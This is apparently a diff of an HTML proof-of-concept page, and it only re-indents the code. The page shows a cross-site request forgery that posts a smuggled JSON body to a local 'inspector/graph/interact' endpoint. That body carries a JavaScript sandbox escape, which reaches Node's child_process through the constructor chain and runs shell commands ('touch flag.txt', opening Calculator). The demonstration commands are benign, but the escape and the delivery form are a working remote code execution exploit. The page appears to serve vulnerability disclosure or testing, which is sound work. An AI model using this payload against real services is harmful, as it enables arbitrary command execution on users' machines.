@@ -43,13 +43,13 @@
     <p>This will execute the <i>touch</i> command in the project's root directory. This payload requires bypassing the sandbox.</p>
     <p>This is the payload being executed:</p>
     <code>
-        (function() { 
-        try{ 
-            propertyIsEnumerable.call();
-        } catch(pp){
-            pp.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch flag.txt');
-        }
-        })()
+(function() { 
+    try{ 
+        propertyIsEnumerable.call();
+    } catch(pp){
+        pp.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch flag.txt');
+    }
+})()
     </code>
     <form action="http://localhost:8000/inspector/graph/interact" method="POST" enctype="text/plain">
         <input name="{&quot;code&quot;: &quot;(function() { try{ propertyIsEnumerable.call(); } catch(pp){ pp.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch flag.txt'); } })()&quot;, &quot;bogus&quot;:&quot;" value="&quot;}" />
@@ -71,13 +71,13 @@
     <p>This payload requires bypassing the sandbox.</p>
     <p>This is the payload being executed:</p>
     <code>
-        (function() { 
-            try{ 
-                propertyIsEnumerable.call();
-            } catch(pp){
-                pp.constructor.constructor('return process')().mainModule.require('child_process').execSync('open /System/Applications/Calculator.app');
-            }
-        })()
+(function() { 
+    try{ 
+        propertyIsEnumerable.call();
+    } catch(pp){
+        pp.constructor.constructor('return process')().mainModule.require('child_process').execSync('open /System/Applications/Calculator.app');
+    }
+})()
     </code>
     <form action="http://localhost:8000/inspector/graph/interact" method="POST" enctype="text/plain">
         <input name="{&quot;code&quot;: &quot;(function() { try{ propertyIsEnumerable.call(); } catch(pp){ pp.constructor.constructor('return process')().mainModule.require('child_process').execSync('open /System/Applications/Calculator.app'); } })()&quot;, &quot;bogus&quot;:&quot;" value="&quot;}" />
